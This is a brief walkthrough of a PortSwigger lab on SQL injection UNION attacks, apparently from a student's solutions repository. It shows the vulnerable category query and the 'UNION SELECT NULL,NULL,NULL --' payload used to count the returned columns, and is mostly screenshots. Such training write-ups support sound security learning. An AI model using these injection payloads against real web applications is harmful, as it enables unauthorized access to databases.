### Lab Description: SQL injection UNION attack, determining the number of columns returned by the query

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/a4e5fd06-f2e6-4f30-9d9d-5b5fd80d851f)

Solution:

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/a26c471c-f708-4c8a-81f0-f27efbc52666)

Here the Query was made as "SELECT * FROM tableName WHERE category = 'Pets'"

As per the requirement of Lab Task we have to add "UNION SELECT NULL --" as payload in query parameters
but we don't know the number or Columns

" SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,NULL,NULL -- "

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/cad7b2d1-7581-452a-849c-26d1a3a05050)

